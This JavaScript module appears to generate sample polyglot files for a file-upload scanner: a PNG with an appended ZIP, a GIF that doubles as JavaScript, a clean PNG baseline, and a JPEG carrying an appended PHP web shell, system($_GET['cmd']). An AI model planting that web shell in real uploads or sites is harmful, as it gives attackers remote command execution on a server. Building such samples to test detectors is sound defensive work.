function buildCleanPng() {
  // Valid 1x1 red RGB PNG with IHDR, IDAT, and IEND
  return new Uint8Array([
    0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
    // IHDR chunk (13 bytes)
    0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
    0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
    0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53, 0xDE,
    // IDAT chunk (12 bytes)
    0x00, 0x00, 0x00, 0x0C, 0x49, 0x44, 0x41, 0x54,
    0x08, 0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00, 0x00,
    0x03, 0x01, 0x01, 0x00, 0x18, 0xDD, 0x8D, 0xB0,
    // IEND chunk (0 bytes)
    0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44,
    0xAE, 0x42, 0x60, 0x82
  ]);
}

function buildPngZipPolyglot() {
  const png = buildCleanPng();
  const fileNameBytes = new TextEncoder().encode('payload_manifest.bin');

  // High-entropy synthetic compressed payload (256 bytes covering all byte values)
  const highEntropyPayload = new Uint8Array(256);
  for (let i = 0; i < 256; i++) {
    highEntropyPayload[i] = (i * 73 + 19) & 0xFF;
  }

  // Local file header (30 bytes)
  const localHeader = new Uint8Array(30 + fileNameBytes.length);
  const view = new DataView(localHeader.buffer);
  view.setUint32(0, 0x504B0304, false); // PK\x03\x04
  view.setUint16(4, 20, true); // version needed
  view.setUint16(8, 8, true); // deflate method
  view.setUint32(18, highEntropyPayload.length, true); // compressed size
  view.setUint32(22, highEntropyPayload.length, true); // uncompressed size
  view.setUint16(26, fileNameBytes.length, true); // filename length
  localHeader.set(fileNameBytes, 30);

  // End of Central Directory (22 bytes)
  const eocd = new Uint8Array([
    0x50, 0x4B, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x01, 0x00, 0x42, 0x00, 0x00, 0x00,
    png.length & 0xFF, (png.length >> 8) & 0xFF, 0x00, 0x00,
    0x00, 0x00
  ]);

  const total = new Uint8Array(png.length + localHeader.length + highEntropyPayload.length + eocd.length);
  let offset = 0;
  total.set(png, offset);
  offset += png.length;
  total.set(localHeader, offset);
  offset += localHeader.length;
  total.set(highEntropyPayload, offset);
  offset += highEntropyPayload.length;
  total.set(eocd, offset);

  return total;
}

function buildGifJsPolyglot() {
  // Classic GIF89a/* ... */=1; JavaScript polyglot
  const gifHeaderWithComment = new Uint8Array([
    0x47, 0x49, 0x46, 0x38, 0x39, 0x61, // GIF89a
    0x2F, 0x2A, // /* (width = 0x2A2F)
    0x01, 0x00, 0x80, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,
    0x21, 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
    0x02, 0x02, 0x44, 0x01, 0x00,
    0x3B // GIF trailer ;
  ]);
  const jsTail = new TextEncoder().encode('*/=1;eval("console.log(1)");');
  const out = new Uint8Array(gifHeaderWithComment.length + jsTail.length);
  out.set(gifHeaderWithComment, 0);
  out.set(jsTail, gifHeaderWithComment.length);
  return out;
}

function buildJpegPhpPolyglot() {
  const jpegHeaderAndBody = new Uint8Array([
    0xFF, 0xD8,
    0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
    0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3F, 0x00,
    0x7F, 0xA2, 0x8A, 0x28, 0x03,
    0xFF, 0xD9
  ]);
  const phpTail = new TextEncoder().encode('<?php /* appended webshell stub */ system($_GET["cmd"]); ?>');
  const out = new Uint8Array(jpegHeaderAndBody.length + phpTail.length);
  out.set(jpegHeaderAndBody, 0);
  out.set(phpTail, jpegHeaderAndBody.length);
  return out;
}

export const SAMPLES = {
  'png-zip': {
    id: 'png-zip',
    title: 'PNG + ZIP Archive Polyglot',
    fileName: 'avatar_bundle.png',
    description: 'Valid PNG image with a high-entropy PKZIP archive appended immediately after the PNG IEND chunk.',
    build: buildPngZipPolyglot
  },
  'gif-js': {
    id: 'gif-js',
    title: 'GIF89a + JavaScript Polyglot',
    fileName: 'banner_tracker.gif',
    description: 'Valid GIF89a header where the screen dimensions double as a C/JS comment opener (/*) followed by executable script.',
    build: buildGifJsPolyglot
  },
  'jpeg-php': {
    id: 'jpeg-php',
    title: 'JPEG + Appended PHP Payload',
    fileName: 'profile_upload.jpg',
    description: 'Valid JFIF/JPEG image stream with a PHP script block appended past the FF D9 End-of-Image marker.',
    build: buildJpegPhpPolyglot
  },
  'clean-png': {
    id: 'clean-png',
    title: 'Clean PNG Baseline',
    fileName: 'verified_icon.png',
    description: 'Standard, unmodified PNG image terminating cleanly at its IEND CRC boundary.',
    build: buildCleanPng
  }
};
